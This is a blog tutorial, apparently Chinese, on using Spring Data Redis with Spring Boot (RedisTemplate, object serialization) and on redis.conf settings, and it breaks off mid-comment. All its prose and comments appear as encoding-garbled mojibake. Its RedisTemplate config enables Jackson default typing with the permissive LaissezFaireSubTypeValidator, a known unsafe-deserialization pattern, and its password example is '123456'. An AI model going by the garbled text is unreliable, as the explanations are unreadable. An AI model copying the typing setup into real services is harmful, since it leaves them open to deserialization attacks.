<p>æˆåŠŸå®Œæˆå¯¹åº”äº‹åŠ¡çš„æ‰§è¡Œ</p>
<h1 id="ä¸ƒã€springbootæ•´åˆ"><a href="#ä¸ƒã€springbootæ•´åˆ" class="headerlink" title="ä¸ƒã€springbootæ•´åˆ"></a>ä¸ƒã€springbootæ•´åˆ</h1><p>SpringData ä¹Ÿæ˜¯å’Œ SpringBoot é½åçš„é¡¹ç›®</p>
<p>å®˜æ–¹ï¼š<a href="https://spring.io/projects/spring-data-redis">https://spring.io/projects/spring-data-redis</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/b0acc7270139d7e8b3ae9f05a3d7e2a9--f176--image-20240921134944904.png" alt="image-20240921134944904"></p>
<p>è¯´æ˜ï¼š åœ¨ SpringBoot2.x ä¹‹åï¼ŒåŸæ¥ä½¿ç”¨çš„jedis è¢«æ›¿æ¢ä¸ºäº† lettuce?</p>
<ul>
<li><p>jedisï¼šé‡‡ç”¨çš„ç›´è¿ï¼Œå¤šä¸ªçº¿ç¨‹æ“ä½œçš„è¯ï¼Œæ˜¯ä¸å®‰å…¨çš„ï¼Œå¦‚æœæƒ³è¦é¿å…ä¸å®‰å…¨ï¼Œä½¿ç”¨redis poolè¿æ¥æ± ï¼Œæ›´åƒBIOæ¨¡å¼ï¼</p>
</li>
<li><p>lettuceï¼šé‡‡ç”¨nettyï¼Œå®ä¾‹å¯ä»¥å†å¤šä¸ªçº¿ç¨‹ä¸­è¿›è¡Œå…±äº«ï¼Œä¸å­˜åœ¨çº¿ç¨‹ä¸å®‰å…¨çš„æƒ…å†µï¼Œå¯ä»¥å‡å°‘çº¿ç¨‹æ•°æ®ã€‚æ›´æ–°NIOæ¨¡å¼ï¼</p>
</li>
</ul>
<blockquote>
<p>ç®€å•çš„ä½¿ç”¨</p>
</blockquote>
<p>1ã€é¦–å…ˆå°±æ˜¯é…ç½®å¯¹åº”çš„è¿æ¥</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é…ç½®redis1</span></span><br><span class="line"><span class="attr">spring.data.redis.host</span>=<span class="string">127.0.0.1</span></span><br><span class="line"><span class="attr">spring.data.redis.port</span>=<span class="string">6379</span></span><br></pre></td></tr></table></figure>

<p>2ã€ç¼–å†™ç®€å•çš„æµ‹è¯•é¡¹ç›®</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//redisTemplate æ“ä½œä¸åŒçš„æ•°æ®ç±»å‹ï¼Œapiå’Œæˆ‘ä»¬çš„linuxæŒ‡ä»¤ä¸€æ ·</span></span><br><span class="line">        <span class="comment">//opsForValue æ“ä½œå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="comment">//opsForList æ“ä½œList</span></span><br><span class="line">        <span class="comment">//opsForSet</span></span><br><span class="line">        <span class="comment">//opsForZSet</span></span><br><span class="line">        <span class="comment">//opsForHash</span></span><br><span class="line">        <span class="comment">//opsForGeo</span></span><br><span class="line">        <span class="comment">//opsForHyperLogLog</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//é™¤äº†åŸºæœ¬çš„æ“ä½œï¼Œæˆ‘ä»¬å¸¸ç”¨çš„æ–¹æ³•éƒ½å¯ä»¥é€šè¿‡redisTemplateæ“ä½œï¼Œæ¯”å¦‚äº‹åŠ¡ï¼Œå’ŒåŸºæœ¬çš„CRUD</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–redisçš„è¿æ¥å¯¹è±¡</span></span><br><span class="line"><span class="comment">//        RedisConnection connection = redisTemplate.getConnectionFactory().getConnection();</span></span><br><span class="line"><span class="comment">//        connection.flushDb();</span></span><br><span class="line"><span class="comment">//        connection.flushAll();</span></span><br><span class="line"></span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zyy&quot;</span>);</span><br><span class="line">        System.out.println(redisTemplate.opsForValue().get(<span class="string">&quot;name&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/adc889f8e480d9101e9a682cf07cc03e--5f82--image-20240921141546981.png" alt="image-20240921141546981"></p>
<blockquote>
<p>è¿›é˜¶ä½¿ç”¨ï¼Œä½¿ç”¨rediså­˜å‚¨å¯¹è±¡</p>
</blockquote>
<p>User.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.demo.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">lizhua</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lizhua&quot;</span>, <span class="number">15</span>);</span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;lizhua&quot;</span>, lizhua);</span><br><span class="line">        System.out.println(redisTemplate.opsForValue().get(<span class="string">&quot;lizhua&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/d54e39df5466feaae7298cf97aee5e9a--02fa--image-20240921141850293.png" alt="image-20240921141850293"></p>
<blockquote>
<p>æ³¨ï¼ï¼ï¼ï¼ï¼å¦‚éœ€å­˜å‚¨å¯¹è±¡åˆ°redisä¸­éœ€è¦å°†å¯¹è±¡ç»§æ‰¿åºåˆ—åŒ–æ–¹æ³•æ‰å¯ä»¥</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/5fb2c887df536e08e31f621f6cf8adb8--df92--image-20240921142050011.png" alt="image-20240921142050011"></p>
<p>ä½†æ˜¯ä»…ä»…æ˜¯è¿™æ ·è¿˜æ˜¯ä¸å¤Ÿå®Œç¾ï¼Œæˆ‘ä»¬å‘ç°ä½¿ç”¨å®¢æˆ·ç«¯å»ç›´æ¥æŸ¥çœ‹æ—¶ï¼Œä¸­æ–‡å°±å˜æˆä¹±ç äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/aea4bca65b7304367936beaf35015e1b--43f7--image-20240921142355477.png" alt="image-20240921142355477"></p>
<blockquote>
<p>ä¸ºè§£å†³ä¸Šè¿°é—®é¢˜ï¼Œè‡ªå®šä¹‰RedisTemplate</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.demo.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonAutoDetect;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.PropertyAccessor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.jsontype.impl.LaissezFaireSubTypeValidator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.RedisConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory factory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//è¿æ¥å·¥å‚</span></span><br><span class="line">        template.setConnectionFactory(factory);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        <span class="comment">//enableDefaultTypingè¿‡æœŸäº†</span></span><br><span class="line"><span class="comment">//        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span></span><br><span class="line">        <span class="comment">//ç”¨activateDefaultTypingä»£æ›¿</span></span><br><span class="line">        objectMapper.activateDefaultTyping(</span><br><span class="line">                LaissezFaireSubTypeValidator.instance ,</span><br><span class="line">                ObjectMapper.DefaultTyping.NON_FINAL,</span><br><span class="line">                JsonTypeInfo.As.WRAPPER_ARRAY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//jacksonåºåˆ—åŒ–</span></span><br><span class="line">        Jackson2JsonRedisSerializer&lt;Object&gt; jackson2JsonRedisSerializer = <span class="keyword">new</span> <span class="title class_">Jackson2JsonRedisSerializer</span>&lt;&gt;(objectMapper, Object.class);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Stringåºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">StringRedisSerializer</span> <span class="variable">stringRedisSerializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>();</span><br><span class="line">        <span class="comment">//keyé‡‡ç”¨Stringçš„åºåˆ—åŒ–æ–¹å¼</span></span><br><span class="line">        template.setKeySerializer(stringRedisSerializer);</span><br><span class="line">        <span class="comment">//hashçš„keyä¹Ÿé‡‡ç”¨Stringçš„åºåˆ—åŒ–æ–¹å¼</span></span><br><span class="line">        template.setHashKeySerializer(stringRedisSerializer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//valueåºåˆ—åŒ–æ–¹å¼é‡‡ç”¨jackson</span></span><br><span class="line">        template.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        <span class="comment">//hashçš„valueåºåˆ—åŒ–æ–¹å¼é‡‡ç”¨jackson</span></span><br><span class="line">        template.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line"></span><br><span class="line">        template.afterPropertiesSet();</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å†æ¬¡è¿è¡Œä¸Šé¢çš„</p>
<p>æ­£å¸¸å–å€¼</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/cc250327ab2d4ee774839c919d390770--b259--image-20240921143716188.png"></p>
<p>ç°åœ¨æ˜¾ç¤ºå°±æ˜¯æ­£å¸¸çš„äº†</p>
<p>æ‰€æœ‰çš„redisæ“ä½œï¼Œå…¶å®å¯¹äºjavaå¼€å‘äººå‘˜æ¥è¯´ï¼Œååˆ†çš„ç®€å•ï¼Œæ›´é‡è¦æ˜¯è¦å»ç†è§£redisçš„æ€æƒ³å’Œæ¯ä¸€ç§æ•°</p>
<p>æ®ç»“æ„çš„ç”¨å¤„å’Œä½œç”¨åœºæ™¯ï¼</p>
<h1 id="å…«ã€Redis-confè¯¦è§£"><a href="#å…«ã€Redis-confè¯¦è§£" class="headerlink" title="å…«ã€Redis.confè¯¦è§£"></a>å…«ã€Redis.confè¯¦è§£</h1><p>å¯åŠ¨çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨å¯åŠ¨åŠ ä¸Šé…ç½®æ–‡ä»¶ä½ç½®ï¼Œä½¿ç”¨å¯¹åº”çš„é…ç½®æ–‡ä»¶å»å¯åŠ¨</p>
<blockquote>
<p>è¡¨æ˜äº†å¯¹åº”çš„å•ä½ï¼Œå¹¶ä¸”è¡¨ç¤ºå¤§å°å†™ä¸æ•æ„Ÿ</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/fda14849b1e9af594d4baed01e26179c--d09c--image-20240921144117554.png" alt="image-20240921144117554"></p>
<blockquote>
<p>åŒ…å«includeï¼Œè¡¨åå¯ä»¥åº”ç”¨å…¶ä»–çš„é…ç½®æ–‡ä»¶</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/4f70669716fa4ed2b31fef9a7a32271f--d02d--image-20240921144208388.png" alt="image-20240921144208388"></p>
<blockquote>
<p>network ç½‘ç»œ</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bind</span> 127.0.0.1  <span class="comment"># ç»‘å®šip</span></span><br><span class="line">protected-mode <span class="built_in">yes</span> <span class="comment"># æ˜¯å¦å¼€å¯ä¿æŠ¤æ¨¡å¼ï¼Œé»˜è®¤å¼€å¯ã€‚è¦æ˜¯é…ç½®é‡Œæ²¡æœ‰æŒ‡å®šbindå’Œå¯†ç ã€‚å¼€å¯è¯¥å‚æ•°åï¼Œredisåªä¼šæœ¬åœ°è¿›è¡Œè®¿é—®ï¼Œæ‹’ç»å¤–éƒ¨è®¿é—®ã€‚è¦æ˜¯å¼€å¯äº†å¯†ç å’Œbindï¼Œå¯ä»¥å…³é—­ã€‚å¦åˆ™æœ€å¥½å¼€å¯ï¼Œè®¾ç½®ä¸ºyesã€‚</span></span><br><span class="line">port 6379 <span class="comment"># ç«¯å£</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>general é€šç”¨</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">daemonize <span class="built_in">yes</span> <span class="comment"># ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œ(æ˜¯å¦åœ¨åå°æ‰§è¡Œ)ï¼Œé»˜è®¤æ˜¯ no </span></span><br><span class="line">pidfile /var/run/redis_6379.pid <span class="comment"># åœ¨åå°çš„æ–¹å¼è¿è¡Œï¼Œæˆ‘ä»¬å°±éœ€è¦æŒ‡å®šä¸€ä¸ªpidæ–‡ä»¶</span></span><br><span class="line">loglevel notice <span class="comment"># è®¾ç½®æ—¥å¿—ç­‰çº§</span></span><br><span class="line">logfile <span class="string">&quot;&quot;</span> <span class="comment"># æŒ‡å®šäº†è®°å½•æ—¥å¿—çš„æ–‡ä»¶ ç©ºå­—ç¬¦ä¸²çš„è¯ï¼Œæ—¥å¿—ä¼šæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ã€‚åå°è¿è¡Œçš„redisæ ‡å‡†è¾“å‡ºæ˜¯/dev/null</span></span><br><span class="line">databases 16  <span class="comment"># æ•°æ®åº“çš„æ•°é‡ï¼Œé»˜è®¤æ˜¯16ä¸ªæ•°æ®åº“</span></span><br><span class="line">always-show-logo no <span class="comment"># æ˜¯å¦æ€»æ˜¾ç¤ºlogo</span></span><br></pre></td></tr></table></figure>

<p>æ—¥å¿—ç­‰çº§</p>
<ul>
<li>debug (a lot of information, useful for development&#x2F;testing)  å¾ˆå¤šä¿¡æ¯ï¼Œæ–¹ä¾¿å¼€å‘ã€æµ‹è¯•</li>
<li>verbose (many rarely useful info, but not a mess like the debug level) è®¸å¤šæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰debugçº§åˆ«ä¿¡æ¯å¤š</li>
<li>notice (moderately verbose, what you want in production probably) é€‚å½“çš„æ—¥å¿—çº§åˆ«ï¼Œé€‚åˆç”Ÿäº§ç¯å¢ƒ</li>
<li>warning (only very important &#x2F; critical messages are logged) è®¸å¤šæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰debugçº§åˆ«ä¿¡æ¯å¤š</li>
</ul>
<blockquote>
<p>snapshotting å¿«ç…§</p>
</blockquote>
<p>æŒä¹…åŒ–ï¼Œ åœ¨è§„å®šçš„æ—¶é—´å†…ï¼Œæ‰§è¡Œäº†å¤šå°‘æ¬¡æ“ä½œï¼Œåˆ™ä¼šæŒä¹…åŒ–åˆ°æ–‡ä»¶</p>
<p>redis æ˜¯å†…å­˜æ•°æ®åº“ï¼Œå¦‚æœæ²¡æœ‰æŒä¹…åŒ–ï¼Œé‚£ä¹ˆæ•°æ®æ–­ç”µåŠå¤±ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">save 900 1 <span class="comment"># å¦‚æœ900ç§’å†…ï¼Œå¦‚æœè‡³å°‘ 1 ä¸ªkeyè¿›è¡Œäº†ä¿®æ”¹ï¼Œæˆ‘ä»¬åˆ™è¿›è¡ŒæŒä¹…åŒ–æ“ä½œ</span></span><br><span class="line">save 300 10 <span class="comment"># å¦‚æœ300ç§’å†…ï¼Œå¦‚æœè‡³å°‘ 10 ä¸ªkeyè¿›è¡Œäº†ä¿®æ”¹ï¼Œæˆ‘ä»¬åˆ™è¿›è¡ŒæŒä¹…åŒ–æ“ä½œ</span></span><br><span class="line">save 60 10000 <span class="comment"># å¦‚æœ60ç§’å†…ï¼Œå¦‚æœè‡³å°‘ 10000 ä¸ªkeyè¿›è¡Œäº†ä¿®æ”¹ï¼Œæˆ‘ä»¬åˆ™è¿›è¡ŒæŒä¹…åŒ–æ“ä½œ</span></span><br><span class="line">stop-writes-on-bgsave-error <span class="built_in">yes</span> <span class="comment">#å½“RDBæŒä¹…åŒ–å‡ºç°é”™è¯¯åï¼Œæ˜¯å¦ä¾ç„¶è¿›è¡Œç»§ç»­è¿›è¡Œå·¥ä½œï¼Œyesï¼šä¸èƒ½è¿›è¡Œå·¥ä½œï¼Œnoï¼šå¯ä»¥ç»§ç»­è¿›è¡Œå·¥ä½œï¼Œå¯ä»¥é€šè¿‡infoä¸­çš„rdb_last_bgsave_statusäº†è§£RDBæŒä¹…åŒ–æ˜¯å¦æœ‰é”™è¯¯</span></span><br><span class="line">rdbcompression <span class="built_in">yes</span> <span class="comment">#ä½¿ç”¨å‹ç¼©rdbæ–‡ä»¶ï¼Œrdbæ–‡ä»¶å‹ç¼©ä½¿ç”¨LZFå‹ç¼©ç®—æ³•ï¼Œyesï¼šå‹ç¼©ï¼Œä½†æ˜¯éœ€è¦ä¸€äº›cpuçš„æ¶ˆè€—ã€‚noï¼šä¸å‹ç¼©ï¼Œéœ€è¦æ›´å¤šçš„ç£ç›˜ç©ºé—´</span></span><br><span class="line">rdbchecksum <span class="built_in">yes</span> <span class="comment">#æ˜¯å¦æ ¡éªŒrdbæ–‡ä»¶ã€‚ä»rdbæ ¼å¼çš„ç¬¬äº”ä¸ªç‰ˆæœ¬å¼€å§‹ï¼Œåœ¨rdbæ–‡ä»¶çš„æœ«å°¾ä¼šå¸¦ä¸ŠCRC64çš„æ ¡éªŒå’Œã€‚è¿™è·Ÿæœ‰åˆ©äºæ–‡ä»¶çš„å®¹é”™æ€§ï¼Œä½†æ˜¯åœ¨ä¿å­˜rdbæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šæœ‰å¤§æ¦‚10%çš„æ€§èƒ½æŸè€—ï¼Œæ‰€ä»¥å¦‚æœä½ è¿½æ±‚é«˜æ€§èƒ½ï¼Œå¯ä»¥å…³é—­è¯¥é…ç½®ã€‚</span></span><br><span class="line"><span class="built_in">dir</span> ./ <span class="comment"># rdbæ–‡ä»¶ä¿å­˜çš„ç›®å½•</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>replication å¤åˆ¶ï¼Œåé¢è®²åˆ°ä¸»ä»å¤åˆ¶çš„æ—¶å€™å†è¯´</p>
</blockquote>
<blockquote>
<p>security å®‰å…¨</p>
</blockquote>
<p>å¯ä»¥åœ¨è¿™é‡Œè®¾ç½®redisçš„å¯†ç ï¼Œé»˜è®¤æ˜¯æ²¡æœ‰å¯†ç ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt; config get requirepass <span class="comment"># è·å–redisçš„å¯†ç </span></span><br><span class="line">1) <span class="string">&quot;requirepass&quot;</span></span><br><span class="line">2) <span class="string">&quot;&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> requirepass 123456 <span class="comment"># è®¾ç½®redisçš„å¯†ç   å–æ¶ˆå¯†ç çš„è¯ï¼Œè¿™æ ·è®¾ç½®å³å¯  config set requirepass &quot;&quot;</span></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>é‡æ–°æ‰“å¼€ä¸€ä¸ªæœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-cli -p 6379</span></span><br><span class="line">127.0.0.1:6379&gt; ping <span class="comment"># å‘ç°æ‰€æœ‰çš„å‘½ä»¤éƒ½æ²¡æœ‰æƒé™äº†</span></span><br><span class="line">(error) NOAUTH Authentication required.</span><br><span class="line">127.0.0.1:6379&gt; auth 123456  <span class="comment"># å¯†ç éªŒè¯</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; ping <span class="comment"># ç„¶åå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨å‘½ä»¤äº†</span></span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt; config get requirepass</span><br><span class="line">1) <span class="string">&quot;requirepass&quot;</span></span><br><span class="line">2) <span class="string">&quot;123456&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>



<blockquote>
<p>clients é™åˆ¶</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxclients 10000 <span class="comment"># è®¾ç½®èƒ½è¿ä¸Šredisçš„æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°é‡ã€‚é»˜è®¤æ˜¯10000ä¸ªå®¢æˆ·ç«¯è¿æ¥ã€‚ç”±äºredisä¸åŒºåˆ†è¿æ¥æ˜¯å®¢æˆ·ç«¯è¿æ¥è¿˜æ˜¯å†…éƒ¨æ‰“å¼€æ–‡ä»¶æˆ–è€…å’Œslaveè¿æ¥ç­‰ï¼Œæ‰€ä»¥maxclientsæœ€å°å»ºè®®è®¾ç½®åˆ°32ã€‚å¦‚æœè¶…è¿‡äº†maxclientsï¼Œredisä¼šç»™æ–°çš„è¿æ¥å‘é€â€™max number of clients reachedâ€™ï¼Œå¹¶å…³é—­è¿æ¥ã€‚</span></span><br><span class="line">maxmemory &lt;bytes&gt; <span class="comment">#redisé…ç½®çš„æœ€å¤§å†…å­˜å®¹é‡ã€‚å½“å†…å­˜æ»¡äº†ï¼Œéœ€è¦é…åˆmaxmemory-policyç­–ç•¥è¿›è¡Œå¤„ç†ã€‚æ³¨æ„slaveçš„è¾“å‡ºç¼“å†²åŒºæ˜¯ä¸è®¡ç®—åœ¨maxmemoryå†…çš„ã€‚æ‰€ä»¥ä¸ºäº†é˜²æ­¢ä¸»æœºå†…å­˜ä½¿ç”¨å®Œï¼Œå»ºè®®è®¾ç½®çš„maxmemoryéœ€è¦æ›´å°ä¸€äº›ã€‚</span></span><br><span class="line">maxmemory-policy noeviction <span class="comment"># å†…å­˜è¾¾åˆ°ä¸Šé™çš„å¤„ç†ç­–ç•¥</span></span><br></pre></td></tr></table></figure>

<p>å½“ Redis å†…å­˜ä½¿ç”¨è¾¾åˆ° <code>maxmemory </code>æ—¶ï¼Œéœ€è¦é€‰æ‹©è®¾ç½®å¥½çš„ <code>maxmemory-policy </code>è¿›è¡Œå¯¹æ•°æ®è¿›è¡Œæ·˜æ±°æœºåˆ¶ã€‚</p>
<p>â€‹    1.volatile-lru(least recently used):æœ€è¿‘æœ€å°‘ä½¿ç”¨ç®—æ³•ï¼Œä»è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®keyä¸­é€‰æ‹©ç©ºè½¬æ—¶é—´æœ€é•¿çš„é”®å€¼å¯¹æ¸…é™¤æ‰ï¼›</p>
<p>â€‹    2.volatile-lfu(least frequently used):æœ€è¿‘æœ€ä¸ç»å¸¸ä½¿ç”¨ç®—æ³•ï¼Œä»è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ä¸­é€‰æ‹©æŸæ®µæ—¶é—´ä¹‹å†…ä½¿ç”¨é¢‘æ¬¡æœ€å°çš„é”®å€¼å¯¹æ¸…é™¤æ‰ï¼›</p>
<p>â€‹    3.volatile-ttl:ä»è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ä¸­é€‰æ‹©è¿‡æœŸæ—¶é—´æœ€æ—©çš„é”®å€¼å¯¹æ¸…é™¤ï¼›</p>
<p>â€‹    4.volatile-random:ä»è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ä¸­ï¼Œéšæœºé€‰æ‹©é”®è¿›è¡Œæ¸…é™¤ï¼›</p>
<p>â€‹    5.allkeys-lru:æœ€è¿‘æœ€å°‘ä½¿ç”¨ç®—æ³•ï¼Œä»æ‰€æœ‰çš„é”®ä¸­é€‰æ‹©ç©ºè½¬æ—¶é—´æœ€é•¿çš„é”®å€¼å¯¹æ¸…é™¤ï¼›</p>
<p>â€‹    6.allkeys-lfu:æœ€è¿‘æœ€ä¸ç»å¸¸ä½¿ç”¨ç®—æ³•ï¼Œä»æ‰€æœ‰çš„é”®ä¸­é€‰æ‹©æŸæ®µæ—¶é—´ä¹‹å†…ä½¿ç”¨é¢‘æ¬¡æœ€å°‘çš„é”®å€¼å¯¹æ¸…é™¤ï¼›</p>
<p>â€‹    7.allkeys-random:æ‰€æœ‰çš„é”®ä¸­ï¼Œéšæœºé€‰æ‹©é”®è¿›è¡Œåˆ é™¤ï¼›</p>
<p>â€‹    8.noeviction:ä¸åšä»»ä½•çš„æ¸…ç†å·¥ä½œï¼Œåœ¨redisçš„å†…å­˜è¶…è¿‡é™åˆ¶ä¹‹åï¼Œæ‰€æœ‰çš„å†™å…¥æ“ä½œéƒ½ä¼šè¿”å›é”™è¯¯ï¼›ä½†æ˜¯è¯»æ“ä½œéƒ½èƒ½æ­£å¸¸çš„è¿›è¡Œ;</p>
<blockquote>
<p>append only mode </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">appendonly no <span class="comment">#é»˜è®¤redisä½¿ç”¨çš„æ˜¯rdbæ–¹å¼æŒä¹…åŒ–ï¼Œè¿™ç§æ–¹å¼åœ¨è®¸å¤šåº”ç”¨ä¸­å·²ç»è¶³å¤Ÿç”¨äº†ã€‚ä½†æ˜¯rediså¦‚æœä¸­é€”å®•æœºï¼Œä¼šå¯¼è‡´å¯èƒ½æœ‰å‡ åˆ†é’Ÿçš„æ•°æ®ä¸¢å¤±ï¼Œæ ¹æ®saveæ¥ç­–ç•¥è¿›è¡ŒæŒä¹…åŒ–ï¼ŒAppend Only Fileæ˜¯å¦ä¸€ç§æŒä¹…åŒ–æ–¹å¼ï¼Œå¯ä»¥æä¾›æ›´å¥½çš„æŒä¹…åŒ–ç‰¹æ€§ã€‚Redisä¼šæŠŠæ¯æ¬¡å†™å…¥çš„æ•°æ®åœ¨æ¥æ”¶åéƒ½å†™å…¥ appendonly.aof æ–‡ä»¶ï¼Œæ¯æ¬¡å¯åŠ¨æ—¶Rediséƒ½ä¼šå…ˆæŠŠè¿™ä¸ªæ–‡ä»¶çš„æ•°æ®è¯»å…¥å†…å­˜é‡Œï¼Œå…ˆå¿½ç•¥RDBæ–‡ä»¶ã€‚</span></span><br><span class="line">appendfilename <span class="string">&quot;appendonly.aof&quot;</span> <span class="comment"># aofæ–‡ä»¶å</span></span><br><span class="line"><span class="comment"># appendfsync always # è¡¨ç¤ºæ¯æ¬¡å†™å…¥éƒ½æ‰§è¡Œfsyncï¼Œä»¥ä¿è¯æ•°æ®åŒæ­¥åˆ°ç£ç›˜</span></span><br><span class="line">appendfsync everysec <span class="comment"># 